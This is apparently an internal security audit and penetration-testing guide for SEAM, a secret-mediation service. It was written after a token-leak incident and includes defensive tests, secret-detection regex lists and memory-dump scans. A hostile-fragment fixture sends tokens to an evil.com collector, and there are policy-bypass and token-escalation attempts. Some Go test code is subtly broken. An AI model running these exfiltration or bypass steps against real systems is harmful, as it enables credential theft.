# SEAM Security Audit and Penetration Testing Guide

## Overview

This guide provides comprehensive procedures for auditing and penetration testing SEAM's secret mediation system to validate that secrets never leak in any context. It addresses the critical security requirements established after the 2026-08-09 token leak incident.

**Last Updated:** 2026-08-15  
**Bead:** seam-764b4829  
**Priority:** P1 (Critical)

## Critical Security Context

### The 2026-08-09 Token Leak Incident

**What Happened:**
A worker on bead `bf-2hwgv` ("Provision GitHub token with declarative-config PR capability") correctly verified a GitHub OAuth token but then pasted the live `gho_` token into `docs/notes/github-token-declarative-config-pr.md` — twice, under "Current Authentication Status" and "Option A". 

**Why It Matters:**
- Only Forgejo's pre-receive hook prevented a public GitHub mirror leak
- The token had to be rotated, causing operational disruption
- The failure was treating "document the token" and "document how to obtain the token" as the same instruction

**Prevention Mechanisms:**
1. `PreToolUse` hook (`~/.claude/hooks/org-rule-guard.py`) now denies writes containing high-signal credential values
2. This audit guide validates that SEAM itself never leaks secrets in any context
3. Separation of concerns: references vs. values is enforced at all layers

## Security Audit Framework

### Layer 1: Application-Level Secret Handling

#### 1.1 Error Response Leak Testing

**Objective:** Validate that secrets never appear in HTTP error responses, regardless of error type.

**Test Procedure:**

```bash
# Test 1: Malformed request with secret injection attempt
curl -X POST http://localhost:8080/github-alerts/issues \
  -H "Content-Type: application/json" \
  -H "X-GitHub-Token: ghp_fake_secret_token_12345" \
  -d '{"invalid":"data"}' | jq '.'

# Test 2: Oversized payload with secret strings
curl -X POST http://localhost:8080/github-alerts/issues \
  -H "Content-Type: application/json" \
  -d '{"token":"gho_SECRET_TO_LEAK_12345","huge":"'$(printf 'a%.0s' {1..10000})'"}' | jq '.'

# Test 3: Path traversal with secret in URL
curl "http://localhost:8080/../../github-token=ghp_SECRET_12345" | jq '.'

# Test 4: Query parameter injection
curl "http://localhost:8080/github-alerts?debug=token:ghp_SECRET_12345" | jq '.'
```

**Validation Criteria:**
```bash
# Check that responses contain NO secret values
curl -X POST http://localhost:8080/github-alerts/issues \
  -H "Content-Type: application/json" \
  -d '{"invalid":"data"}' | grep -iE "(ghp_|gho_|ghu_|token.*:.*[a-zA-Z0-9]{30,})" && echo "LEAK DETECTED" || echo "SAFE"
```

**Expected Results:**
- ❌ Secret tokens should NEVER appear in error responses
- ❌ Secret tokens should NEVER appear in stack traces
- ❌ Secret tokens should NEVER appear in debug messages
- ✅ Generic error messages only (e.g., "invalid request", "authentication failed")

#### 1.2 Log File Leak Testing

**Objective:** Validate that secrets are never written to log files, even at debug levels.

**Test Procedure:**

```bash
# Enable debug logging
export SEAM_LOG_LEVEL=debug
export SEAM_LOG_FILE=/tmp/seam-debug.log

# Generate requests with various secret patterns
for secret in "ghp_TEST_SECRET_12345" "gho_LEAK_THIS_67890" "sk_test_key_xyz"; do
  curl -X POST http://localhost:8080/github-alerts/issues \
    -H "X-Test-Token: $secret" \
    -d '{"test":"data"}' &
done

wait

# Check logs for secret leaks
grep -iE "(ghp_|gho_|sk_test|api_key.*:)" /tmp/seam-debug.log && echo "LOG LEAK DETECTED" || echo "LOGS SAFE"
```

**Log Leak Detection Patterns:**
```bash
# Comprehensive secret pattern check
SECRET_PATTERNS=(
  "ghp_[A-Za-z0-9]{36}"           # GitHub PAT
  "gho_[A-Za-z0-9]{36}"           # GitHub OAuth
  "ghu_[A-Za-z0-9]{20}"           # GitHub user
  "sk_test_[A-Za-z0-9]{24}"       # Stripe test key
  "Bearer [A-Za-z0-9]{30,}"        # Bearer tokens
  "api[_-]?key['\"]?\s*[:=]\s*['\"]?[A-Za-z0-9]{20,}"  # API keys
)

for pattern in "${SECRET_PATTERNS[@]}"; do
  if grep -iE "$pattern" /var/log/seam/*.log; then
    echo "PATTERN MATCH: $pattern"
  fi
done
```

**Validation Criteria:**
- ❌ No secrets in any log file (debug, info, error, access)
- ❌ No secrets in stdout/stderr streams
- ❌ No secrets in crash dumps
- ✅ Log entries contain only references (paths, not values)

#### 1.3 Debug Output Leak Testing

**Objective:** Validate that debug endpoints and verbose modes don't expose secrets.

**Test Procedure:**

```bash
# Test debug endpoint with secret injection
curl "http://localhost:8080/_seam/debug?include=secrets&token=ghp_SECRET_12345" | jq '.'

# Test health endpoint with secret in headers
curl -H "X-Debug-Token: ghp_SECRET_12345" \
     http://localhost:8080/_seam/health | jq '.'

# Test metrics endpoint for secret exposure
curl -H "X-Metrics-Secret: ghp_SECRET_12345" \
     http://localhost:8081/metrics | grep -i secret

# Test OpenAPI spec endpoint
curl http://localhost:8080/openapi.json | jq '.. | strings | select(test("ghp_|gho_|token"))'
```

**Validation Criteria:**
- ❌ Debug endpoints should never return secret values
- ❌ Health checks should never include secret credentials
- ❌ Metrics should never expose secret patterns
- ✅ Debug output shows only metadata (operation counts, not content)

### Layer 2: Memory and Stack Trace Safety

#### 2.1 Memory Dump Analysis

**Objective:** Validate that secrets don't appear in memory dumps or core files.

**Test Procedure:**

```go
// Create a test that forces a panic with secret in memory
func TestSecretMemoryIsolation(t *testing.T) {
    // Simulate secret handling
    testSecret := "ghp_TEST_SECRET_FOR_MEMORY_ANALYSIS_123456789012"
    
    // Force panic to generate stack trace
    defer func() {
        if r := recover(); r != nil {
            stack := debug.Stack()
            if strings.Contains(string(stack), testSecret) {
                t.Fatalf("SECRET IN STACK TRACE: %s", testSecret)
            }
        }
    }()
    
    // Simulate secret usage that should never appear in stack
    processSecret(testSecret)
    
    panic("test panic for stack analysis")
}
```

**Production Memory Analysis:**

```bash
# Generate core dump for running SEAM process
SEAM_PID=$(pgrep seam)
gcore $SEAM_PID /tmp/seam-core.$SEAM_PID

# Search core dump for secret patterns
strings /tmp/seam-core.$SEAM_PID | grep -iE "(ghp_|gho_|token.*:.*[A-Za-z0-9]{30,})" && echo "MEMORY LEAK" || echo "MEMORY SAFE"

# Clean up
rm /tmp/seam-core.$SEAM_PID
```

**Validation Criteria:**
- ❌ No secrets in stack traces
- ❌ No secrets in heap dumps
- ❌ No secrets in core files
- ✅ Memory contains only secret references (not values)

#### 2.2 Go Runtime Safety Validation

**Objective:** Validate Go runtime doesn't expose secrets in panic/recover scenarios.

**Test Code:**

```go
// internal/server/secret_memory_test.go
package server

import (
    "runtime/debug"
    "strings"
    "testing"
)

// TestPanicWithSecretInScope validates that secrets in scope
// during panic don't leak into stack traces
func TestPanicWithSecretInScope(t *testing.T) {
    testSecret := "ghp_PANIC_TEST_SECRET_123456789012"
    
    defer func() {
        if r := recover(); r != nil {
            stack := debug.Stack()
            stackStr := string(stack)
            
            // Check for secret in stack trace
            if strings.Contains(stackStr, testSecret) {
                t.Errorf("SECRET FOUND IN STACK TRACE: %s", testSecret)
                t.Logf("Stack trace:\n%s", stackStr)
            }
            
            // Check for secret in heap metadata
            buildInfo, ok := debug.ReadBuildInfo()
            if ok {
                for _, dep := range buildInfo.Deps {
                    if strings.Contains(dep.Path, testSecret) {
                        t.Errorf("SECRET FOUND IN BUILD INFO: %s", testSecret)
                    }
                }
            }
        }
    }()
    
    // Simulate processing with secret in local scope
    processRequestWithSecret(testSecret)
    
    // Force panic to trigger stack trace
    panic("forced panic for secret leak testing")
}

func processRequestWithSecret(secret string) {
    // This simulates how SEAM processes secrets
    // The secret should never appear in stack traces
    _ = secret
}
```

**Validation Criteria:**
- ✅ Panics don't expose secrets in stack traces
- ✅ Runtime errors don't leak secret values
- ✅ Debug.PrintStack() doesn't show secrets

### Layer 3: OpenBao Policy Enforcement

#### 3.1 Policy Boundary Testing

**Objective:** Validate that OpenBao policies correctly restrict access at all boundaries.

**Automated Test Suite:**

```bash
#!/bin/bash
# scripts/test-openbao-policies.sh

set -e

OPENBAO_ADDR="http://openbao-rs-manager.openbao.svc.cluster.local:8200"
EVALUATOR_TOKEN_PATH="evaluators/seam-retirement-evaluator/github-token"
SEAM_ROUTE_PATH="seam/routes/test-route/token"

echo "=== OpenBao Policy Enforcement Test ==="

# Test 1: SEAM cannot read evaluator token
echo "Test 1: SEAM token cannot read evaluator path..."
if bao kv get $EVALUATOR_TOKEN_PATH 2>&1 | grep -i "permission denied"; then
  echo "✓ PASS: SEAM correctly denied evaluator token"
else
  echo "✗ FAIL: SEAM can read evaluator token (SECURITY BREACH)"
  exit 1
fi

# Test 2: Evaluator cannot read SEAM routes
echo "Test 2: Evaluator token cannot read SEAM routes..."
if bao kv get $SEAM_ROUTE_PATH 2>&1 | grep -i "permission denied"; then
  echo "✓ PASS: Evaluator correctly denied SEAM routes"
else
  echo "✗ FAIL: Evaluator can read SEAM routes (SECURITY BREACH)"
  exit 1
fi

# Test 3: Both roles denied other paths
echo "Test 3: Both roles denied access to other secrets..."
for path in "armor/api-key" "kalshi/credentials" "global/config"; do
  if bao kv get $path 2>&1 | grep -i "permission denied"; then
    echo "✓ PASS: Access correctly denied for $path"
  else
    echo "✗ FAIL: Unexpected access to $path"
    exit 1
  fi
done

echo "=== All policy enforcement tests passed ==="
```

**Policy Validation:**

```bash
# Validate policy syntax and structure
bao policy read seam | tee /tmp/seam-policy.txt
bao policy read seam-retirement-evaluator-policy | tee /tmp/eval-policy.txt

# Check for required deny rules
echo "Checking SEAM policy deny rules..."
grep -q "evaluators.*deny" /tmp/seam-policy.txt || echo "❌ Missing evaluators deny in SEAM policy"
grep -q "secret/data/\*.*deny" /tmp/seam-policy.txt || echo "❌ Missing default-deny in SEAM policy"

echo "Checking Evaluator policy deny rules..."
grep -q "seam/routes.*deny" /tmp/eval-policy.txt || echo "❌ Missing seam/routes deny in Evaluator policy"
grep -q "secret/data/\*.*deny" /tmp/eval-policy.txt || echo "❌ Missing default-deny in Evaluator policy"
```

#### 3.2 Token Lifecycle Testing

**Objective:** Validate that tokens have proper TTL, renewal, and revocation.

**Test Procedure:**

```go
// internal/server/token_lifecycle_test.go
package server

import (
    "context"
    "testing"
    "time"
)

// TestTokenTTLValidation validates that OpenBao tokens expire
// at the configured TTL (24h)
func TestTokenTTLValidation(t *testing.T) {
    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
    defer cancel()
    
    // Create a test token
    token, err := createToken(ctx, testOpenBaoAddr, rootToken, "seam-policy", "24h")
    if err != nil {
        t.Fatalf("Failed to create token: %v", err)
    }
    
    // Verify token TTL metadata
    tokenMeta, err := lookupToken(ctx, testOpenBaoAddr, token)
    if err != nil {
        t.Fatalf("Failed to lookup token: %v", err)
    }
    
    // Validate TTL is approximately 24h
    expectedTTL := 24 * time.Hour
    actualTTL := tokenMeta.TTL
    if actualTTL > expectedTTL + time.Hour || actualTTL < expectedTTL - time.Hour {
        t.Errorf("Token TTL out of expected range: got %v, want %v", actualTTL, expectedTTL)
    }
    
    t.Logf("✓ Token TTL validated: %v", actualTTL)
}

// TestTokenRevocation validates that revoked tokens cannot access secrets
func TestTokenRevocation(t *testing.T) {
    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
    defer cancel()
    
    // Create and validate a token
    token, _ := createToken(ctx, testOpenBaoAddr, rootToken, "seam-policy", "24h")
    validateTokenAccess(ctx, token, t)
    
    // Revoke the token
    if err := revokeToken(ctx, testOpenBaoAddr, token); err != nil {
        t.Fatalf("Failed to revoke token: %v", err)
    }
    
    // Verify token cannot access secrets after revocation
    client := openbao.NewClient(testOpenBaoAddr, token)
    _, err := client.ReadSecret(ctx, "seam/routes/test/token")
    if err == nil {
        t.Fatal("REVOKED TOKEN CAN STILL ACCESS SECRETS (SECURITY BREACH)")
    }
    
    t.Logf("✓ Token revocation validated")
}
```

### Layer 4: Namespace Isolation Enforcement

#### 4.1 Kubernetes Namespace Boundary Testing

**Objective:** Validate that Kubernetes namespace boundaries prevent cross-namespace access.

**Test Procedure:**

```bash
#!/bin/bash
# scripts/test-namespace-isolation.sh

set -e

echo "=== Kubernetes Namespace Isolation Test ==="

# Test 1: SEAM pod cannot access evaluator namespace resources
echo "Test 1: Testing namespace boundaries from SEAM pod..."
kubectl exec -n seam deployment/seam -- \
  curl -s http://seam-retirement-evaluator.seam.svc.cluster.local:8080/health || {
    echo "✓ PASS: SEAM pod cannot access evaluator service (expected failure)"
  }

# Test 2: Evaluator pod cannot access SEAM routes directly
echo "Test 2: Testing namespace boundaries from evaluator pod..."
kubectl exec -n seam deployment/seam-retirement-evaluator -- \
  curl -s http://seam.seam.svc.cluster.local:8080/_seam/health && {
    echo "⚠ WARNING: Evaluator can access SEAM health endpoint (expected for health checks)"
  }

# Test 3: Cross-namespace OpenBao access denied
echo "Test 3: Testing cross-namespace OpenBao access..."
kubectl run -n seam cross-ns-test --rm -i --restart=Never --image=curlimages/curl -- \
  curl -s http://openbao.openbao.svc.cluster.local:8200/v1/auth/kubernetes/login || {
    echo "✓ PASS: Cross-namespace OpenBao access denied"
  }

echo "=== Namespace isolation validated ==="
```

**Network Policy Validation:**

```bash
# Check if network policies enforce namespace isolation
kubectl get networkpolicies -n seam

# Test network policy enforcement
echo "Testing network policy enforcement..."

# From SEAM pod, try to reach evaluator namespace
kubectl exec -n seam deployment/seam -- timeout 5 bash -c \
  "curl -s http://seam-retirement-evaluator.seam.svc.cluster.local:8080/" || {
  echo "✓ Network policy blocks SEAM->evaluator traffic"
}

# From external pod, try to reach SEAM
kubectl run -n default test-pod --rm -i --restart=Never --image=curlimages/curl -- \
  timeout 5 curl -s http://seam.seam.svc.cluster.local:8080/ || {
  echo "✓ Network policy blocks external->SEAM traffic"
}
```

#### 4.2 ServiceAccount Boundary Testing

**Objective:** Validate that ServiceAccount tokens cannot be used across namespaces or roles.

**Test Procedure:**

```bash
# Test ServiceAccount token isolation
echo "=== ServiceAccount Boundary Testing ==="

# Get SEAM ServiceAccount token
SEAM_SA_TOKEN=$(kubectl get secret -n seam \
  $(kubectl get sa -n seam seam -o jsonpath='{.secrets[0].name}') \
  -o jsonpath='{.data.token}' | base64 -d)

# Try to use SEAM SA token to access evaluator resources
kubectl auth can-i get secrets --namespace=seam --token=$SEAM_SA_TOKEN || {
  echo "✓ SEAM SA token correctly limited to SEAM namespace"
}

# Try to use SEAM SA token with evaluator OpenBao role
kubectl run -n seam sa-test --rm -i --restart=Never --image=ghcr.io/openbao/openbao:1.15.0 \
  -- bash -c "
    bao write auth/kubernetes/login role=seam-retirement-evaluator jwt=$SEAM_SA_TOKEN
  " || {
  echo "✓ SEAM SA token cannot assume evaluator OpenBao role"
}

echo "=== ServiceAccount boundaries validated ==="
```

### Layer 5: Secret Reference vs Value Verification

#### 5.1 Reference-Only Validation

**Objective:** Validate that SEAM stores and transmits only secret references, never values.

**Test Procedure:**

```bash
# Test that OpenAPI spec contains only references
echo "Testing OpenAPI spec for secret values..."

curl -s http://localhost:8080/openapi.json | jq '.components.securitySchemes'

# Check for any actual secret patterns in spec
if curl -s http://localhost:8080/openapi.json | grep -iE "(ghp_|gho_|api_key.*:.*[A-Za-z0-9]{20,})"; then
  echo "❌ SECRET VALUES FOUND IN OPENAPI SPEC"
  exit 1
else
  echo "✓ OpenAPI spec contains only references"
fi

# Test that responses contain only references
curl -s http://localhost:8080/github-alerts/issues -X POST -d '{}' | jq '.'

if curl -s http://localhost:8080/github-alerts/issues -X POST -d '{}' | grep -iE "(ghp_|gho_|token.*:.*[A-Za-z0-9]{20,})"; then
  echo "❌ SECRET VALUES FOUND IN API RESPONSES"
  exit 1
else
  echo "✓ API responses contain only references"
fi
```

**Reference Pattern Validation:**

```go
// internal/server/reference_only_test.go
package server

import (
    "encoding/json"
    "net/http"
    "net/http/httptest"
    "testing"
    "strings"
)

// TestResponsesContainOnlyReferences validates that all API responses
// contain secret references (paths) but never secret values
func TestResponsesContainOnlyReferences(t *testing.T) {
    server := setupTestServer(t)
    defer server.Close()
    
    // Test various endpoints
    endpoints := []struct{
        method string
        path string
        body string
    }{
        {"GET", "/docs", ""},
        {"GET", "/openapi.json", ""},
        {"POST", "/github-alerts/issues", "{}"},
        {"GET", "/_seam/health", ""},
    }
    
    SECRET_PATTERNS := []string{
        "ghp_[A-Za-z0-9]{36}",
        "gho_[A-Za-z0-9]{36}",
        "Bearer [A-Za-z0-9]{30,}",
        "api[_-]?key['\"]?\s*[:=]\s*['\"]?[A-Za-z0-9]{20,}",
    }
    
    for _, endpoint := range endpoints {
        req := httptest.NewRequest(endpoint.method, endpoint.path, strings.NewReader(endpoint.body))
        w := httptest.ResponseRecorder()
        
        server.ServeHTTP(w, req)
        
        var response map[string]interface{}
        if err := json.NewDecoder(w.Body).Decode(&response); err == nil {
            responseJSON, _ := json.Marshal(response)
            responseStr := string(responseJSON)
            
            for _, pattern := range SECRET_PATTERNS {
                if strings.Contains(responseStr, pattern) {
                    t.Errorf("SECRET PATTERN MATCH in %s %s: %s", endpoint.method, endpoint.path, pattern)
                }
            }
        }
    }
    
    t.Logf("✓ All responses validated: references only, no values")
}
```

## Penetration Testing Procedures

### PEN-TEST 1: Hostile Fragment Attack Simulation

**Objective:** Simulate a malicious route fragment author attempting to exfiltrate credentials.

**Attack Scenarios:**

```yaml
# fragments/hostile-fragment-attack.yaml
# This fragment simulates various exfiltration attempts

- name: "DNS Exfiltration Test"
  host: "malicious.evil.com"
  endpoints:
    - path: /exfil-dns
      method: POST
      openbao:
        path: seam/routes/github-alerts/token  # Try to access SEAM secret
      backend:
        url: "http://evil.com/collect?secret={{openbao.token}}"
        
- name: "Error Message Exfiltration"
  host: "localhost"
  endpoints:
    - path: /error-exfil
      method: POST
      openbao:
        path: evaluators/seam-retirement-evaluator/github-token  # Wrong path
      backend:
        url: "http://localhost:8080/error"
        # Hope error message contains the secret
        
- name: "Log Injection Attack"
  host: "localhost"
  endpoints:
    - path: /log-inject
      method: POST
      openbao:
        path: seam/routes/test/token
      backend:
        url: "http://localhost:8080/log?level=debug&secret={{openbao.token}}"
```

**Test Execution:**

```bash
#!/bin/bash
# scripts/pen-test-hostile-fragment.sh

echo "=== Hostile Fragment Penetration Test ==="

# Load hostile fragments
cp fragments/hostile-fragment-attack.yaml spec/routes/

# Restart SEAM with hostile fragments
pkill seam
./seam serve --spec-dir spec/routes &
SEAM_PID=$!
sleep 2

# Test 1: DNS exfiltration attempt
echo "Test 1: DNS exfiltration attempt..."
curl -X POST http://localhost:8080/exfil-dns -d '{"test":"data"}' | jq '.'

# Test 2: Error message exfiltration
echo "Test 2: Error message exfiltration attempt..."
curl -X POST http://localhost:8080/error-exfil -d '{"test":"data"}' 2>&1 | grep -i "ghp_" && echo "LEAK IN ERROR" || echo "SAFE"

# Test 3: Log injection
echo "Test 3: Log injection attempt..."
curl -X POST http://localhost:8080/log-inject -d '{"test":"data"}'
tail -20 /var/log/seam.log | grep -iE "(ghp_|gho_|token)" && echo "LEAK IN LOGS" || echo "SAFE"

# Cleanup
kill $SEAM_PID
rm fragments/hostile-fragment-attack.yaml

echo "=== Hostile fragment pen-test complete ==="
```

**Expected Results:**
- ❌ DNS exfiltration should fail (OpenBao policy denies cross-path access)
- ❌ Error messages should not contain secret values
- ❌ Logs should not contain injected secret patterns
- ✅ All attempts return generic error messages

### PEN-TEST 2: Memory Dump Attack

**Objective:** Attempt to extract secrets from process memory.

**Attack Procedure:**

```bash
#!/bin/bash
# scripts/pen-test-memory-dump.sh

echo "=== Memory Dump Penetration Test ==="

# Start SEAM with test secrets
export TEST_SECRET="ghp_MEMORY_TEST_SECRET_123456789012"
./seam serve &
SEAM_PID=$!
sleep 2

# Generate memory dump
gcore $SEAM_PID /tmp/seam-mem-test.core

# Search for secrets in memory
echo "Searching memory dump for secrets..."
if strings /tmp/seam-mem-test.core | grep -iE "(ghp_|gho_|TEST_SECRET)"; then
  echo "❌ SECRET FOUND IN MEMORY DUMP"
  grep -iE "(ghp_|gho_|TEST_SECRET)" /tmp/seam-mem-test.core
  LEAK_DETECTED=true
else
  echo "✓ No secrets in memory dump"
  LEAK_DETECTED=false
fi

# Cleanup
kill $SEAM_PID
rm /tmp/seam-mem-test.core

if [ "$LEAK_DETECTED" = true ]; then
  echo "SECURITY ISSUE: Secrets leaked in memory"
  exit 1
fi

echo "=== Memory dump pen-test passed ==="
```

### PEN-TEST 3: OpenBao Policy Bypass

**Objective:** Attempt to bypass OpenBao policy restrictions.

**Attack Vectors:**

```bash
#!/bin/bash
# scripts/pen-test-openbao-bypass.sh

echo "=== OpenBao Policy Bypass Penetration Test ==="

# Attack 1: Path traversal attempt
echo "Attack 1: Path traversal in secret path..."
bao kv get seam/routes/../../../evaluators/seam-retirement-evaluator/github-token 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"

# Attack 2: Policy wildcard exploit
echo "Attack 2: Wildcard path expansion..."
bao kv get "seam/routes/*" 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"

# Attack 3: Token escalation attempt
echo "Attack 3: Token privilege escalation..."
# Try to use SEAM token to create new tokens with elevated privileges
bao write auth/token/create policies=seam,root ttl=24h 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"

# Attack 4: Metadata endpoint exploitation
echo "Attack 4: Metadata endpoint exploitation..."
bao kv get metadata/seam/routes 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"

echo "=== OpenBao bypass pen-test complete ==="
```

## Continuous Security Monitoring

### Automated Security Scans

**Daily Security Scan:**

```yaml
# declarative-config/k8s/iad-ci/argo-workflows/seam-security-scan.yaml
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: seam-security-scan
  namespace: argo-workflows
spec:
  entrypoint: security-scan
  templates:
  - name: security-scan
    steps:
    - - name: log-leak-check
        template: log-leak-check
    - - name: memory-leak-check
        template: memory-leak-check
    - - name: policy-enforcement-check
        template: policy-enforcement-check
    - - name: reference-only-check
        template: reference-only-check
        
  - name: log-leak-check
    container:
      image: ghcr.io/ardenone/seam:latest
      command: ["/bin/bash", "-c"]
      args:
        - |
          # Check logs for secret patterns
          for log_file in /var/log/seam/*.log; do
            if grep -iE "(ghp_|gho_|token.*:.*[A-Za-z0-9]{30,})" "$log_file"; then
              echo "SECURITY ISSUE: Secret found in $log_file"
              exit 1
            fi
          done
          echo "✓ Log leak check passed"
          
  - name: memory-leak-check
    container:
      image: ghcr.io/ardenone/seam:latest
      securityContext:
        privileged: true
      command: ["/bin/bash", "-c"]
      args:
        - |
          # Generate core dump and analyze
          SEAM_PID=$(pgrep seam)
          gcore $SEAM_PID /tmp/seam-scan.core
          
          if strings /tmp/seam-scan.core | grep -iE "(ghp_|gho_|token)"; then
            echo "SECURITY ISSUE: Secret found in memory"
            exit 1
          fi
          
          rm /tmp/seam-scan.core
          echo "✓ Memory leak check passed"
          
  - name: policy-enforcement-check
    container:
      image: ghcr.io/openbao/openbao:1.15.0
      command: ["/bin/bash", "-c"]
      args:
        - |
          # Test SEAM policy
          bao kv get evaluators/seam-retirement-evaluator/github-token 2>&1 | grep -i "permission denied"
          # Test Evaluator policy  
          bao kv get seam/routes/test/token 2>&1 | grep -i "permission denied"
          echo "✓ Policy enforcement check passed"
          
  - name: reference-only-check
    container:
      image: curlimages/curl
      command: ["/bin/bash", "-c"]
      args:
        - |
          # Check OpenAPI spec
          curl -s http://seam.seam.svc.cluster.local:8080/openapi.json | \
            grep -iE "(ghp_|gho_|token)" && exit 1
          
          # Check API responses
          curl -s -X POST http://seam.seam.svc.cluster.local:8080/github-alerts/issues \
            -d '{}' | grep -iE "(ghp_|gho_|token)" && exit 1
          
          echo "✓ Reference-only check passed"
```

### Security Alerting

**Alert Conditions:**

1. **Secret in Logs Alert**
   - Trigger: Secret pattern detected in any log file
   - Severity: CRITICAL
   - Response: Immediate investigation, service shutdown

2. **Secret in Response Alert**
   - Trigger: Secret pattern detected in HTTP response
   - Severity: CRITICAL
   - Response: Service shutdown, incident response

3. **Policy Violation Alert**
   - Trigger: OpenBao policy enforcement fails
   - Severity: HIGH
   - Response: Policy review, token revocation

4. **Memory Leak Alert**
   - Trigger: Secret found in memory dump
   - Severity: HIGH
   - Response: Code review, memory safety audit

## Incident Response Procedures

### Level 1: Suspected Secret Leak

**Immediate Actions:**

1. **Containment**
   ```bash
   # Stop SEAM service immediately
   kubectl scale deployment seam -n seam --replicas=0
   
   # Revoke all OpenBao tokens
   bao lease revoke -prefix "auth/kubernetes/role/seam"
   bao lease revoke -prefix "auth/kubernetes/role/seam-retirement-evaluator"
   ```

2. **Investigation**
   ```bash
   # Capture logs for analysis
   kubectl logs -n seam deployment/seam --all-containers=true > /tmp/seam-incident-$(date +%s).log
   
   # Generate memory dump before shutdown
   SEAM_POD=$(kubectl get pods -n seam -l app=seam -o jsonpath='{.items[0].metadata.name}')
   kubectl exec -n seam $SEAM_POD -- gcore 1 /tmp/seam-incident-memory.core
   kubectl cp seam/$SEAM_POD:/tmp/seam-incident-memory.core /tmp/seam-incident-memory.core
   ```

3. **Analysis**
   ```bash
   # Search logs for leaked secrets
   grep -iE "(ghp_|gho_|token.*:.*[A-Za-z0-9]{30,})" /tmp/seam-incident-*.log
   
   # Search memory dump for secrets
   strings /tmp/seam-incident-memory.core | grep -iE "(ghp_|gho_|token)"
   ```

### Level 2: Confirmed Secret Leak

**Emergency Response:**

1. **Secret Rotation**
   ```bash
   # Rotate all potentially compromised secrets
   for secret_path in \
     "evaluators/seam-retirement-evaluator/github-token" \
     "seam/routes/*/token" \
     "monitoring/victoriametrics/readonly-credentials"
   do
     echo "Rotating secret: $secret_path"
     # Implement secret rotation procedure
   done
   ```

2. **Service Recovery**
   ```bash
   # Review and fix security vulnerability
   # Update OpenBao policies if needed
   # Redeploy with security fix
   
   kubectl scale deployment seam -n seam --replicas=1
   ```

3. **Post-Incident Review**
   - Document root cause
   - Update security procedures
   - Add new test cases to prevent recurrence

## Compliance and Audit Trail

### Security Audit Checklist

**Pre-Deployment Audit:**

- [ ] Error responses contain no secret values
- [ ] Log files contain no secret patterns
- [ ] Debug output shows no secrets
- [ ] Memory dumps contain no secrets
- [ ] Stack traces contain no secrets
- [ ] OpenBao policies correctly restrict access
- [ ] ServiceAccount boundaries enforced
- [ ] Network policies restrict cross-namespace access
- [ ] API responses contain only references
- [ ] OpenAPI spec contains no secret values
- [ ] All security tests pass (unit, integration, e2e)
- [ ] Penetration tests show no vulnerabilities

**Post-Deployment Audit:**

- [ ] Daily security scans show no issues
- [ ] Log monitoring detects no secret patterns
- [ ] Memory analysis shows no leaks
- [ ] Policy enforcement tests pass
- [ ] Reference-only validation passes
- [ ] No security alerts triggered

### Audit Documentation

**Required Audit Artifacts:**

1. **Test Execution Logs**
   - All security test runs with timestamps
   - Test results and any failures
   - Remediation actions taken

2. **Policy Documentation**
   - Current OpenBao policies
   - Kubernetes RBAC configuration
   - Network policy configuration

3. **Incident Reports**
   - Any security incidents
   - Root cause analysis
   - Remediation steps

4. **Compliance Evidence**
   - Security test results
   - Penetration test reports
   - Continuous monitoring results

## Related Documentation

- **Security Isolation Model:** `docs/security-isolation-model.md`
- **Testing Isolation Runbook:** `docs/testing-isolation-runbook.md`
- **AGENTS.md:** Project-level security rules and incident history
- **OpenBao Research:** `docs/research/openbao-kubernetes-auth-seam-research.md`

## References

- **Bead:** seam-764b4829 (security audit documentation task)
- **2026-08-09 Incident:** Token leak in `docs/notes/github-token-declarative-config-pr.md`
- **OpenBao Policies:** `declarative-config/infra/seam/seam-openbao-policy.hcl`
- **Security Tests:** `internal/server/openbao_token_access_denial_test.go`
- **E2E Tests:** `internal/server/e2e_isolation_test.go`

---

**Security is a process, not a product.** This guide should be updated continuously as new threats emerge and SEAM evolves. All security concerns must be treated as P1 critical issues.